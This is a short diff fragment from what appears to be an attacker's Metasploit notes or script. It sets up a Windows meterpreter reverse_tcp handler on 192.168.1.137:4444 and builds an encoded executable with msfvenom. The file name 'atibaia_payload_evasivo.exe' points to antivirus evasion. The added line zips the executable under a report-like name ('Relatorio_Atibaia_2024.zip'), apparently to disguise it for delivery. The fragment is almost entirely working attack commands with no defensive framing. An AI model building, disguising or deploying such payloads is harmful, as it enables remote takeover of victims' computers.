@@ -30,6 +30,9 @@ set PAYLOAD windows/x64/meterpreter/reverse_tcp
 set LHOST 192.168.1.137
 set LPORT 4444
 run
+
+zip Relatorio_Atibaia_2024.zip atibaia_payload_evasivo.exe
+
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.137 LPORT=4444 -e x64/xor_dynamic -i 5 -f exe -o atibaia_payload_evasivo.exe
 
 
